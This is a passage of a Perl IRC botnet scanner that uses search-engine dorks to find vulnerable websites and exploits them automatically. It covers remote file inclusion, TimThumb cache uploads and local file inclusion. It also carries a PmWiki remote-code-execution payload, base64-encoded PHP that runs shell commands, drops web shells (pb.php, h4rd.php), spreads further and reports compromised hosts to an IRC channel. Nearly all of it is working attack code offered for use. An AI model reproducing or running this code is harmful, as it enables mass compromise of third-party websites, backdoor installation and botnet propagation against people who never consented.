   elsif ($type == 2){$type=&lfi($chan,$bug,$dork,$engine);}
   elsif ($type == 3){$type=&e107($chan,$bug,$dork,$engine);}
   elsif ($type == 4){$type=&xml($chan,$bug,$dork,$engine);}
   elsif ($type == 5){$type=&sql($chan,$bug,$dork,$engine);}
   elsif ($type == 6){$type=&osco($chan,$bug,$dork,$engine);}
   elsif ($type == 7){$type=&osco2($chan,$bug,$dork,$engine);}
   elsif ($type == 8){$type=&cpanel($chan,$bug,$dork,$engine);}
   elsif ($type == 9){$type=&cpanel2($chan,$bug,$dork,$engine);}
   elsif ($type == 10){$type=&adm($chan,$bug,$dork,$engine);}
   elsif ($type == 11){$type=&op($chan,$bug,$dork,$engine);}
   elsif ($type == 12){$type=&zen($chan,$bug,$dork,$engine);}
   elsif ($type == 13){$type=&osco3($chan,$bug,$dork,$engine);}
   elsif ($type == 14){$type=&lfd($chan,$bug,$dork,$engine);}
   elsif ($type == 15){$type=&osco4($chan,$bug,$dork,$engine);}
   elsif ($type == 16){$type=&timrfi($chan,$bug,$dork,$engine);}
   elsif ($type == 17){$type=&PmWiki($chan,$bug,$dork,$engine);}
}
sub scan_start() {
my ($chan,$bug,$dork,$engine,$type) = @_;
    if ($engine =~ /google/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Google",$type); } exit; }
    }
    if ($engine =~ /google2/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Google2",$type); } exit; }
    }
   if ($engine =~ /gigablast/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GigaBlast",$type); } exit; }
    }
   if ($engine =~ /euroseek/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"EuroSeek",$type); } exit; }
    }
   if ($engine =~ /alltheweb/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Alltheweb",$type); } exit; }
    }
    if ($engine =~ /bing/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bing",$type); } exit; }
    }
    if ($engine =~ /altavista/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Altavista",$type); } exit; }
    }
    if ($engine =~ /ask/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Ask",$type); } exit; }
    }
    if ($engine =~ /uol/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Uol",$type); } exit; }
    }
    if ($engine =~ /yahoo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Yahoo",$type); } exit; }
    }
   if ($engine =~ /yahoo2/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Yahoo2",$type); } exit; }
    }
    if ($engine =~ /clusty/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Clusty",$type); } exit; }
    }
    if ($engine =~ /gutser/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Gutser",$type); } exit; }
    }
    if ($engine =~ /rediff/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Rediff",$type); } exit; }
    }
   if ($engine =~ /mamma/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Mamma",$type); } exit; }
    }
    if ($engine =~ /virgilio/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Virgilio",$type); } exit; }
    }
    if ($engine =~ /webde/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Webde",$type); } exit; }
    }
    if ($engine =~ /exalead/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Exalead",$type); } exit; }
    }
    if ($engine =~ /lycos/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Lycos",$type); } exit; }
    }
    if ($engine =~ /hotbot/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Hotbot",$type); } exit; }
    }
    if ($engine =~ /aol/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Aol",$type); } exit; }
    }
    if ($engine =~ /sapo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Sapo",$type); } exit; }
    }
    if ($engine =~ /duck/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Duck",$type); } exit; }
    }
    if ($engine =~ /yause/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Yause",$type); } exit; }
    }
    if ($engine =~ /baidu/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Baidu",$type); } exit; }
    }
    if ($engine =~ /black/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Black",$type); } exit; }
    }
   if ($engine =~ /onet/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Onet",$type); } exit; }
    }
   if ($engine =~ /sizuka/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Sizuka",$type); } exit; }
    }
   if ($engine =~ /walla/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Walla",$type); } exit; }
    }
   if ($engine =~ /demos/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Demos",$type); } exit; }
    }
   if ($engine =~ /rose/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Rose",$type); } exit; }
    }
   if ($engine =~ /seznam/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Seznam",$type); } exit; }
    }
   if ($engine =~ /tiscali/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tiscali",$type); } exit; }
    }
   if ($engine =~ /naver/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Naver",$type); } exit; }
    }   
   if ($engine =~ /amidalla/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AmiDalLa",$type); } exit; }
    }
   if ($engine =~ /buscar/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BusCaR",$type); } exit; }
    }
   if ($engine =~ /kvasir/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"KvaSiR",$type); } exit; }
    }
   if ($engine =~ /excite/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"eXciTe",$type); } exit; }
    }
   if ($engine =~ /interia/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"InteRia",$type); } exit; }
    }
   if ($engine =~ /snz/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"SnZ",$type); } exit; }
    }
   if ($engine =~ /rambler/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"RambLer",$type); } exit; }
    }   
   if ($engine =~ /yandex/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"YaNdeX",$type); } exit; }
    }
   ###### NIEUWE ######
   if ($engine =~ /netsprint/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"NetSprint",$type); } exit; }
    }
   if ($engine =~ /saol/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"sAol",$type); } exit; }
    }
   if ($engine =~ /lookle/i) {
      if ($pid = fork) { waitpid($pid, 0); }
      else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Lookle",$type); } exit; }
   }
   if ($engine =~ /optuszoo/i) {
      if ($pid = fork) { waitpid($pid, 0); }
      else { if (fork) { exit; } else { &type($chan,$bug,$dork,"optusZoo",$type); } exit; }
   }
   if ($engine =~ /search66/i) {
      if ($pid = fork) { waitpid($pid, 0); }
      else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Search66",$type); } exit; }
   }
   if ($engine =~ /arrama/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Arrama",$type); } exit; }
    }
   if ($engine =~ /excitejp/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"eXciteJP",$type); } exit; }
    }
   if ($engine =~ /biglobe/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BigLobe",$type); } exit; }
    }
   if ($engine =~ /clix/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Clix",$type); } exit; }
    }
   if ($engine =~ /searchch/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { &type($chan,$bug,$dork,"SearchCH",$type); } exit; }
    }
   if ($engine =~ /cada/i) {
      if ($pid = fork) { waitpid($pid, 0); }
      else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cada",$type); } exit; }
   }
   ####################
}
#########################################
sub rfi() {
   my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$rfilogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$rfilogo 12(4@0$engine12) 9==14F9=15I9=0N9=0I9=0S9=14H9=="); } }
            my $coba = "http://".$site.$bug.$injector;
            my $test = "http://".$site.$bug;
            my $cek  = &get_content($test);sleep(1);
            &get_content($coba);sleep(1);
            if ($cek =~ /failed to open stream/i) {
               &rfi_xpl($test,$chan,$site,$engine);
            }
      }
   }
}

sub rfi_xpl() {
my $url    = $_[0];
my $chan   = $_[1];
my $site   = $_[2];
my $engine = $_[3];
my $dor  = $url.$botshell."?";
my $test = $url.$injector."?";
my $check = &get_content($dor);
            &get_content($test);sleep(1);
         if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/i) {
         &info_main($dor,$chan,$engine,$rfilogo);
           }
}

######################## timrfi
sub timrfi() {
     my $chan = $_[0];
     my $bug = $_[1];
     my $dork = $_[2];
     my $engine = $_[3];
     my $count = 0;
     my @list = search_engine($chan,$bug,$dork,$engine,$timlogo);
     my $num = scalar(@list);
     if ($num > 0) {
         foreach my $site (@list) {
             $count++;
             if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$timlogo 12(4@0$engine12) 9==14F9=15I9=0N9=0I9=0S9=14H9=="); } }
            my $vuln = "http://".$site.$bug;
            my @dirs = ("functions","functions/scripts","functions/timthumb","framework/includes","framework/thumb",
                     "scripts","scripts/timthumb","scripts/thumb","lib","lib/script","lib/thumb","lib/timthumb",
                     "inc","includes","includes/thumb","includes/timthumb","library","library/thumb",
                     "library/resource","library/timthumb","library/functions","modules","images","phpthumb",
                     "layouts","phpThumb","thumb","timThumb","timthumb","tools","tools/timthumb","tools/thumb","options","js","");
            foreach my $dir (@dirs) {
            
               my $testsha = "http://".$site.$bug.$dir."/timthumb.php?src=".$blog."sh.php";       
               my $testbta = "http://".$site.$bug.$dir."/timthumb.php?src=".$blog."index.php";
                  
               my $htmla  = &get_content($testsha); &get_content($testbta); sleep(3);
               if ($htmla =~ /Unable to open image/i ) {
               &tim_xpla0($vuln,$dir,$blog,$chan,$site,$engine);
               &tim_xplb0($vuln,$dir,$blog,$chan,$site,$engine);
               &tim_xplc0($vuln,$dir,$blog,$chan,$site,$engine);
               &tim_xpld0($vuln,$dir,$blog,$chan,$site,$engine);

               &tim_xpla1($vuln,$blog,$chan,$site,$engine); &tim_xplb1($vuln,$blog,$chan,$site,$engine); &tim_xplc1($vuln,$blog,$chan,$site,$engine); &tim_xpld1($vuln,$blog,$chan,$site,$engine);
               &tim_xpla2($vuln,$blog,$chan,$site,$engine); &tim_xplb2($vuln,$blog,$chan,$site,$engine); &tim_xplc2($vuln,$blog,$chan,$site,$engine); &tim_xpld2($vuln,$blog,$chan,$site,$engine);
               }
            }
            foreach my $dir (@dirs) {
            
               my $testshb = "http://".$site.$bug.$dir."/thumb.php?src=".$blog."sh.php";       
               my $testbtb = "http://".$site.$bug.$dir."/thumb.php?src=".$blog."index.php";
                  
               my $htmlb  = &get_content($testshb); &get_content($testbtb); sleep(3);
               if ($htmlb =~ /Unable to open image/i ) {
               &tim_xpla0($vuln,$dir,$blog,$chan,$site,$engine);
               &tim_xplb0($vuln,$dir,$blog,$chan,$site,$engine);
               &tim_xplc0($vuln,$dir,$blog,$chan,$site,$engine);
               &tim_xpld0($vuln,$dir,$blog,$chan,$site,$engine);

               &tim_xpla1($vuln,$blog,$chan,$site,$engine); &tim_xplb1($vuln,$blog,$chan,$site,$engine); &tim_xplc1($vuln,$blog,$chan,$site,$engine); &tim_xpld1($vuln,$blog,$chan,$site,$engine);
               &tim_xpla2($vuln,$blog,$chan,$site,$engine); &tim_xplb2($vuln,$blog,$chan,$site,$engine); &tim_xplc2($vuln,$blog,$chan,$site,$engine); &tim_xpld2($vuln,$blog,$chan,$site,$engine);
               }
            }
            foreach my $dir (@dirs) {
            
               my $testshb = "http://".$site.$bug.$dir."/phpThumb.php?src=".$blog."sh.php";       
               my $testbtb = "http://".$site.$bug.$dir."/phpThumb.php?src=".$blog."index.php";
                  
               my $htmlb  = &get_content($testshb); &get_content($testbtb); sleep(3);
               if ($htmlb =~ /Unable to open image/i ) {
               &tim_xpla0($vuln,$dir,$blog,$chan,$site,$engine);
               &tim_xplb0($vuln,$dir,$blog,$chan,$site,$engine);
               &tim_xplc0($vuln,$dir,$blog,$chan,$site,$engine);
               &tim_xpld0($vuln,$dir,$blog,$chan,$site,$engine);

               &tim_xpla1($vuln,$blog,$chan,$site,$engine); &tim_xplb1($vuln,$blog,$chan,$site,$engine); &tim_xplc1($vuln,$blog,$chan,$site,$engine); &tim_xpld1($vuln,$blog,$chan,$site,$engine);
               &tim_xpla2($vuln,$blog,$chan,$site,$engine); &tim_xplb2($vuln,$blog,$chan,$site,$engine); &tim_xplc2($vuln,$blog,$chan,$site,$engine); &tim_xpld2($vuln,$blog,$chan,$site,$engine);
               }
            }
         }
   #   exit;
    }
 }
# dirs getted from engine #
sub tim_xpla0() {
   my($url,$dir,$mode,$chan,$site,$engine) = @_;
   my $shell = $mode."sh.php"; my $bot = $mode."index.php"; my $dor = $url.$dir."cache/external_".md5_hex($shell).".php";
   my $dur = $url.$dir."cache/external_".md5_hex($bot).".php"; my $check = &get_content($dor); &get_content($dur); sleep(1);
      if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) { &info_main($dor,$chan,$engine,$timlogo); } }
      
sub tim_xplb0() {
   my($url,$dir,$mode,$chan,$site,$engine) = @_;
   my $shell = $mode."sh.php"; my $bot = $mode."index.php"; my $dor = $url.$dir."cache/".md5_hex($shell).".php";
   my $dur = $url.$dir."cache/".md5_hex($bot).".php"; my $check = &get_content($dor); &get_content($dur); sleep(1);
      if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) {   &info_main($dor,$chan,$engine,$timlogo); } }
      
sub tim_xplc0() {
   my($url,$dir,$mode,$chan,$site,$engine) = @_;
   my $shell = $mode."sh.php"; my $bot = $mode."index.php"; my $dor = $url.$dir."temp/external_".md5_hex($shell).".php";
   my $dur = $url.$dir."temp/external_".md5_hex($bot).".php"; my $check = &get_content($dor); &get_content($dur); sleep(1);
      if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) {   &info_main($dor,$chan,$engine,$timlogo); } }

sub tim_xpld0() {
   my($url,$dir,$mode,$chan,$site,$engine) = @_;
   my $shell = $mode."sh.php"; my $bot = $mode."index.php"; my $dor = $url.$dir."temp/".md5_hex($shell).".php";
   my $dur = $url.$dir."temp/".md5_hex($bot).".php"; my $check = &get_content($dor); &get_content($dur); sleep(1);
      if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) {   &info_main($dor,$chan,$engine,$timlogo); } }

# /
sub tim_xpla1() {
   my($url,$mode,$chan,$site,$engine) = @_;
   my $shell = $mode."sh.php"; my $bot = $mode."index.php"; my $dor = $url."cache/external_".md5_hex($shell).".php";
   my $dur = $url."cache/external_".md5_hex($bot).".php"; my $check = &get_content($dor); &get_content($dur); sleep(1);
      if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) { &info_main($dor,$chan,$engine,$timlogo); } }
      
sub tim_xplb1() {
   my($url,$mode,$chan,$site,$engine) = @_;
   my $shell = $mode."sh.php"; my $bot = $mode."index.php"; my $dor = $url."cache/".md5_hex($shell).".php";
   my $dur = $url."cache/".md5_hex($bot).".php"; my $check = &get_content($dor); &get_content($dur); sleep(1);
      if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) {   &info_main($dor,$chan,$engine,$timlogo); } }
      
sub tim_xplc1() {
   my($url,$mode,$chan,$site,$engine) = @_;
   my $shell = $mode."sh.php"; my $bot = $mode."index.php"; my $dor = $url."temp/external_".md5_hex($shell).".php";
   my $dur = $url."temp/external_".md5_hex($bot).".php"; my $check = &get_content($dor); &get_content($dur); sleep(1);
      if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) {   &info_main($dor,$chan,$engine,$timlogo); } }

sub tim_xpld1() {
   my($url,$mode,$chan,$site,$engine) = @_;
   my $shell = $mode."sh.php"; my $bot = $mode."index.php"; my $dor = $url."temp/".md5_hex($shell).".php";
   my $dur = $url."temp/".md5_hex($bot).".php"; my $check = &get_content($dor); &get_content($dur); sleep(1);
      if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) {   &info_main($dor,$chan,$engine,$timlogo); } }

# /uploads/thumb-temp/
sub tim_xpla2() {
   my($url,$mode,$chan,$site,$engine) = @_;
   my $shell = $mode."sh.php"; my $bot = $mode."index.php"; my $dor = $url."wp-content/uploads/thumb-temp/external_".md5_hex($shell).".php";
   my $dur = $url."wp-content/uploads/thumb-temp/external_".md5_hex($bot).".php"; my $check = &get_content($dor); &get_content($dur); sleep(1);
      if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) { &info_main($dor,$chan,$engine,$timlogo); } }
      
sub tim_xplb2() {
   my($url,$mode,$chan,$site,$engine) = @_;
   my $shell = $mode."sh.php"; my $bot = $mode."index.php"; my $dor = $url."wp-content/uploads/thumb-temp/".md5_hex($shell).".php";
   my $dur = $url."wp-content/uploads/thumb-temp/".md5_hex($bot).".php"; my $check = &get_content($dor); &get_content($dur); sleep(1);
      if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) {   &info_main($dor,$chan,$engine,$timlogo); } }

sub tim_xplc2() {
   my($url,$mode,$chan,$site,$engine) = @_;
   my $shell = $mode."sh.php"; my $bot = $mode."index.php"; my $dor = $url."wp-content/uploads/thumb-cache/external_".md5_hex($shell).".php";
   my $dur = $url."wp-content/uploads/thumb-cache/external_".md5_hex($bot).".php"; my $check = &get_content($dor); &get_content($dur); sleep(1);
      if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) { &info_main($dor,$chan,$engine,$timlogo); } }
      
sub tim_xpld2() {
   my($url,$mode,$chan,$site,$engine) = @_;
   my $shell = $mode."sh.php"; my $bot = $mode."index.php"; my $dor = $url."wp-content/uploads/thumb-cache/".md5_hex($shell).".php";
   my $dur = $url."wp-content/uploads/thumb-cache/".md5_hex($bot).".php"; my $check = &get_content($dor); &get_content($dur); sleep(1);
      if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/ ) {   &info_main($dor,$chan,$engine,$timlogo); } }

######################### PmWiki
sub PmWiki() {
   my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$e107logo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$pmwilogo 12(4@0$engine12) 10==14F10=15I10=0N10=0I10=15S10=14H10== "); } }
            my $test = "http://".$site.$bug;
            my $code = "ZWNobyAidjBwQ3Izdzxicj4iOw0KZWNobyAic3lzOiIucGhwX3VuYW1lKCkuIjxicj4iOw0KJGNtZD0iZWNobyBub2IwZHlDcjN3IjsNCiRlc2VndWljbWQ9ZXgoJGNtZCk7DQplY2hvICRlc2VndWljbWQ7DQpmdW5jdGlvbiBleCgkY2ZlKXsNCiRyZXMgPSAnJzsNCmlmICghZW1wdHkoJGNmZSkpew0KaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpew0KQGV4ZWMoJGNmZSwkcmVzKTsNCiRyZXMgPSBqb2luKCJcbiIsJHJlcyk7DQp9DQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpew0KJHJlcyA9IEBzaGVsbF9leGVjKCRjZmUpOw0KfQ0KZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpew0KQG9iX3N0YXJ0KCk7DQpAc3lzdGVtKCRjZmUpOw0KJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsNCkBvYl9lbmRfY2xlYW4oKTsNCn0NCmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1Jykpew0KQG9iX3N0YXJ0KCk7DQpAcGFzc3RocnUoJGNmZSk7DQokcmVzID0gQG9iX2dldF9jb250ZW50cygpOw0KQG9iX2VuZF9jbGVhbigpOw0KfQ0KZWxzZWlmKEBpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkY2ZlLCJyIikpKXsNCiRyZXMgPSAiIjsNCndoaWxlKCFAZmVvZigkZikpIHsgJHJlcyAuPSBAZnJlYWQoJGYsMTAyNCk7IH0NCkBwY2xvc2UoJGYpOw0KfX0NCnJldHVybiAkcmVzOw0KfQ==";
            my $html = &PmWiki_rce_query($test,$code);
            if ($html =~ /v0pCr3w<br>sys:(.+?)<br>nob0dyCr3w/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                    my $sys = $1;
                    my $upload = 'if(@copy("'.$injector.'","pb.php")) { echo "c0liSUKSESc0li";@copy("'.$botshell.'","h4rd.php"); } ';
                    my $res = &PmWiki_rce_query($test,encode_base64($upload));
                    if ($res =~ /c0liSUKSESc0li/) {
                  &get_content("http://".$site."pb.php");
                  &msg("$chan","$pmwilogo 12(4@0$engine12)(4@8SHELL12)13 http://".$site."13h4rd.php 12(4@8".$sys."12)(4@0safemode-9OFF12) ");sleep(2);
               }
                    &PmWiki_spread_query($test);
                    sleep(2);
                } exit; } sleep(2);
            }
            elsif ($html =~ /v0pCr3w<br>sys:(.+?)<br>/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                    my $sys = $1;
                    my $upload = 'if(@copy("'.$injector.'","pb.php")) { echo "c0liSUKSESc0li";@copy("'.$botshell.'","h4rd.php"); }';
                    my $res = &PmWiki_rce_query($test,encode_base64($upload));
                    if ($res =~ /c0liSUKSESc0li/) {
                  &get_content("http://".$site."pb.php");
                  &msg("$chan","$pmwilogo (4@0$engine12)(4@8SHELL12)13 http://".$site."13h4rd.php 12(4@8".$sys."12(4@0safemode-4ON12) ");sleep(2)
               }
            &PmWiki_spread_query($test);
                sleep(2); } exit; }
            }
        }
    }
}

sub PmWiki_rce_query() {
    my $url = $_[0];
    my $code = $_[1];
   my $cmd = "eval(base64_decode(".$code."));include('".$injector."');";
    my $req = HTTP::Request->new(POST => $url);
    $req->content_type("application/x-www-form-urlencoded");
    $req->content("action=edit&post=save&n=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $res = $ua->request($req);
    return $res->content;
}
sub PmWiki_spread_query() {
    my $url = $_[0];
    my $code = "ZWNobyAidjBwQ3Izdzxicj4iOw0KZWNobyAic3lzOiIucGhwX3VuYW1lKCkuIjxicj4iOw0KJGNtZD0iZWNobyBub2IwZHlDcjN3IjsNCiRlc2VndWljbWQ9ZXgoJGNtZCk7DQplY2hvICRlc2VndWljbWQ7DQpmdW5jdGlvbiBleCgkY2ZlKXsNCiRyZXMgPSAnJzsNCmlmICghZW1wdHkoJGNmZSkpew0KaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpew0KQGV4ZWMoJGNmZSwkcmVzKTsNCiRyZXMgPSBqb2luKCJcbiIsJHJlcyk7DQp9DQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpew0KJHJlcyA9IEBzaGVsbF9leGVjKCRjZmUpOw0KfQ0KZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpew0KQG9iX3N0YXJ0KCk7DQpAc3lzdGVtKCRjZmUpOw0KJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsNCkBvYl9lbmRfY2xlYW4oKTsNCn0NCmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1Jykpew0KQG9iX3N0YXJ0KCk7DQpAcGFzc3RocnUoJGNmZSk7DQokcmVzID0gQG9iX2dldF9jb250ZW50cygpOw0KQG9iX2VuZF9jbGVhbigpOw0KfQ0KZWxzZWlmKEBpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkY2ZlLCJyIikpKXsNCiRyZXMgPSAiIjsNCndoaWxlKCFAZmVvZigkZikpIHsgJHJlcyAuPSBAZnJlYWQoJGYsMTAyNCk7IH0NCkBwY2xvc2UoJGYpOw0KfX0NCnJldHVybiAkcmVzOw0KfQ==";
    my $cmd = "eval(base64_decode(".$code."));include('".$injector."');";
   my $req = HTTP::Request->new(POST => $url);
    $req->content_type("application/x-www-form-urlencoded");
    $req->content("action=edit&post=save&n=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $res = $ua->request($req);
}

######################## LFD
sub lfd() {
   my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$lfdlogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$lfdlogo(7@2$engine15)10 Scan finish for14 $dork"); } }
            my $test = "http://".$site.$bug.$lfdtest;
            my $vuln = "http://".$site."12".$bug."6".$lfdtest;
            my $html = &get_content($test);
            if ($html =~ /$lfdoutput/) {
                &msg("$chan","$lfdlogo(7@2$engine15)15(13@12Vuln15)4 ".$vuln." $nob0dy");
                sleep(3);
            }
        }
    }
}
######################## LFI
sub lfi() {
   my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$lfilogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$lfilogo 12(4@0$engine12) 8==14F8=15I8=0N8=0I8=15S8=14H8== "); } }
             my $dirs = ("../../../../../../../../../../../../../../../../../../../../../../../..",
                  "../../../../../../../../../../../../../../../../../../../../../../..",
                  "../../../../../../../../../../../../../../../../../../../../../..",
                  "../../../../../../../../../../../../../../../../../../../../..",
                  "../../../../../../../../../../../../../../../../../../../..",
                  "../../../../../../../../../../../../../../../../../../..",
                  "../../../../../../../../../../../../../../../../../..",
                  "../../../../../../../../../../../../../../../../..",
                  "../../../../../../../../../../../../../../../..",
                  "../../../../../../../../../../../../../../..",
                  "../../../../../../../../../../../../../..",
                  "../../../../../../../../../../../../..",
                  "../../../../../../../../../../../..",
                  "../../../../../../../../../../..",
                  "../../../../../../../../../..",
                  "../../../../../../../../..",
                  "../../../../../../../..",
                  "../../../../../../..",
